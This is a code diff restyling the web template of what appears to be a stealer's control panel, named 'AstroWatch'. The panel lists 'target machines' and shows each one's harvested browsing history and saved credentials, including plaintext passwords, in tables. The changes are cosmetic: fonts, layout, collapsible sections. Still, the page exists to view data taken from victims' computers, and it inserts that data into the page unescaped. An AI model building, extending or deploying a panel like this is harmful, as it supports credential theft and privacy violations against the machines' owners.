@@ -4,24 +4,40 @@
   <meta charset="UTF-8" >
   <title>Collected Data | AstroWatch</title>
   <style>
+     @font-face {
+      font-family: 'Inter';
+      src: url("{{ url_for('static', filename='assets/fonts/inter/Inter.ttf') }}") format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Orbitron';
+      src: url("{{ url_for('static', filename='assets/fonts/orbit/Orbitron.ttf') }}") format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
     body {
       background-color: #0f0d25;
-      font-family: Inter, sans-serif;
+      font-family: sans-serif;
       color: white;
       margin: 0;
       padding: 2rem;
+      transition: opacity 0.3s ease;
     }
 
     .title {
-      font-size: 32px;
+      font-size: 35px;
       font-weight: bold;
+      font-family: Orbitron;
       margin-bottom: 0.25rem;
     }
 
     .subtitle {
-      font-size: 16px;
-      opacity: 0.75;
+      font-size: 20px;
       margin-bottom: 2rem;
+      opacity: 0.7;
     }
 
     .dropdown {
@@ -29,7 +45,7 @@
       color: white;
       border: none;
       padding: 0.5rem 1rem;
-      font-size: 14px;
+      font-size: 17px;
       border-radius: 6px;
       margin-bottom: 1.5rem;
     }
@@ -39,11 +55,23 @@
     }
 
     .section-title {
-      font-size: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
       font-weight: bold;
-      margin-bottom: 1rem;
-      border-bottom: 1px solid #333;
-      padding-bottom: 0.3rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .toggle-btn {
+      background: none;
+      border: none;
+      color: #ccc;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .toggle-btn:hover {
+      color: white;
     }
 
     table {
@@ -69,36 +97,72 @@
       background-color: #1a1a33;
     }
 
-    .back-button {
+    .button-row {
       position: absolute;
       top: 20px;
       right: 20px;
+      display: flex;
+      gap: 0.75rem;
+    }
+
+    .back-button {
       background-color: #1c1b88;
       color: white;
       border: none;
       padding: 0.5rem 1.2rem;
       border-radius: 20px;
-      font-size: 14px;
+      font-size: 16px;
       cursor: pointer;
+      font-weight: bold;
+      z-index: 10;
     }
 
     .empty {
       font-style: italic;
       opacity: 0.6;
     }
+
+    .decor {
+      position: absolute;
+      right: 50%;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .ellipse, .ellipse-2, .ellipse-3, .ellipse-4 {
+      position: absolute;
+      background-color: #0d0588;
+      border-radius: 50%;
+    }
+
+    .ellipse   { width: 1200px; height: 1200px; left: calc(50% - 600px); top: calc(50% - 600px); opacity: 0.1; }
+    .ellipse-2 { width: 1000px; height: 1000px; left: calc(50% - 500px); top: calc(50% - 500px); opacity: 0.25; }
+    .ellipse-3 { width: 800px;  height: 800px;  left: calc(50% - 400px); top: calc(50% - 400px); opacity: 0.5; }
+    .ellipse-4 { width: 600px;  height: 600px;  left: calc(50% - 300px); top: calc(50% - 300px); opacity: 0.75; }
+
   </style>
 </head>
 <body>
   <div class="title">Collected Data</div>
   <div class="subtitle">Select target machine:</div>
-  <button class="back-button" onclick="window.location.href='/clients'">Back</button>
+<div class="button-row">
+  <button class="back-button" onclick="window.location.href='/clients'">Clients</button>
+  <button class="back-button" onclick="window.location.href='/dashboard'">Back</button>
+</div>
 
   <select id="clientSelect" class="dropdown">
-    <option value="">-- Select Machine ID --</option>
+            <option value="">-- (None Selected) --</option>
   </select>
 
-  <div class="section">
-    <div class="section-title">Browsing History</div>
+<div class="section">
+  <div class="section-title">
+    Browsing History
+<button class="toggle-btn" onclick="toggleSection('historySection', this)">[Hide]</button>
+  </div>
+  <div id="historySection">
     <table>
       <thead>
         <tr>
@@ -111,9 +175,14 @@
       <tbody id="historyBody"></tbody>
     </table>
   </div>
+</div>
 
-  <div class="section">
-    <div class="section-title">Session Credentials</div>
+<div class="section">
+  <div class="section-title">
+    Session Credentials
+<button class="toggle-btn" onclick="toggleSection('credentialsSection', this)">[Hide]</button>
+  </div>
+  <div id="credentialsSection">
     <table>
       <thead>
         <tr>
@@ -126,80 +195,96 @@
       <tbody id="credentialBody"></tbody>
     </table>
   </div>
+</div>
 
-  <script>
-    const select = document.getElementById('clientSelect');
-    const historyBody = document.getElementById('historyBody');
-    const credentialBody = document.getElementById('credentialBody');
 
-    function clearTables() {
-      historyBody.innerHTML = '';
-      credentialBody.innerHTML = '';
-    }
+        <div class="decor">
+  <div class="ellipse"></div>
+  <div class="ellipse-2"></div>
+  <div class="ellipse-3"></div>
+  <div class="ellipse-4"></div>
+        </div>
 
-    function loadClientData(machine_id) {
-      clearTables();
-      if (!machine_id) return;
+<script>
+  const select = document.getElementById('clientSelect');
+  const historyBody = document.getElementById('historyBody');
+  const credentialBody = document.getElementById('credentialBody');
 
-      fetch(`/api/history/${machine_id}`)
-        .then(res => res.json())
-        .then(data => {
-          if (!data.length) {
-            historyBody.innerHTML = `<tr><td colspan="4" class="empty">No history found.</td></tr>`;
-          } else {
-            data.forEach(entry => {
-              const row = document.createElement('tr');
-              row.innerHTML = `
-                <td>${entry.url}</td>
-                <td>${entry.title}</td>
-                <td>${entry.visit_time}</td>
-                <td>${entry.browser_type}</td>
-              `;
-              historyBody.appendChild(row);
-            });
-          }
-        });
+  function clearTables() {
+    historyBody.innerHTML = '';
+    credentialBody.innerHTML = '';
+  }
 
-      fetch(`/api/credentials/${machine_id}`)
-        .then(res => res.json())
-        .then(data => {
-          if (!data.length) {
-            credentialBody.innerHTML = `<tr><td colspan="4" class="empty">No credentials found.</td></tr>`;
-          } else {
-            data.forEach(entry => {
-              const row = document.createElement('tr');
-              row.innerHTML = `
-                <td>${entry.website}</td>
-                <td>${entry.username}</td>
-                <td>${entry.password}</td>
-                <td>${entry.browser_type}</td>
-              `;
-              credentialBody.appendChild(row);
-            });
-          }
-        });
-    }
+  function loadClientData(machine_id) {
+    clearTables();
+    if (!machine_id) return;
 
-    fetch('/api/clients')
+    fetch(`/api/history/${machine_id}`)
       .then(res => res.json())
       .then(data => {
-        data.forEach(client => {
-          const opt = document.createElement('option');
-          opt.value = client.machine_id;
-          opt.textContent = `${client.hostname || client.machine_id} (${client.status})`;
-          select.appendChild(opt);
-        });
-
-        const defaultId = new URLSearchParams(window.location.search).get("client");
-        if (defaultId) {
-          select.value = defaultId;
-          loadClientData(defaultId);
+        if (!data.length) {
+          historyBody.innerHTML = `<tr><td colspan="4" class="empty">No history found.</td></tr>`;
+        } else {
+          data.forEach(entry => {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+              <td>${entry.url}</td>
+              <td>${entry.title}</td>
+              <td>${entry.visit_time}</td>
+              <td>${entry.browser_type}</td>
+            `;
+            historyBody.appendChild(row);
+          });
         }
       });
 
-    select.addEventListener('change', () => {
-      loadClientData(select.value);
+    fetch(`/api/credentials/${machine_id}`)
+      .then(res => res.json())
+      .then(data => {
+        if (!data.length) {
+          credentialBody.innerHTML = `<tr><td colspan="4" class="empty">No credentials found.</td></tr>`;
+        } else {
+          data.forEach(entry => {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+              <td>${entry.website}</td>
+              <td>${entry.username}</td>
+              <td>${entry.password}</td>
+              <td>${entry.browser_type}</td>
+            `;
+            credentialBody.appendChild(row);
+          });
+        }
+      });
+  }
+
+  fetch('/api/clients')
+    .then(res => res.json())
+    .then(data => {
+      data.forEach(client => {
+        const opt = document.createElement('option');
+        opt.value = client.machine_id;
+        opt.textContent = `${client.hostname || client.machine_id} (${client.status})`;
+        select.appendChild(opt);
+      });
+
+      const defaultId = new URLSearchParams(window.location.search).get("client");
+      if (defaultId) {
+        select.value = defaultId;
+        loadClientData(defaultId);
+      }
     });
-  </script>
+
+  select.addEventListener('change', () => {
+    loadClientData(select.value);
+  });
+
+  function toggleSection(id, btn) {
+    const el = document.getElementById(id);
+    const visible = window.getComputedStyle(el).display !== 'none';
+    el.style.display = visible ? 'none' : 'block';
+    btn.textContent = visible ? '[Expand]' : '[Hide]';
+  }
+</script>
 </body>
 </html>
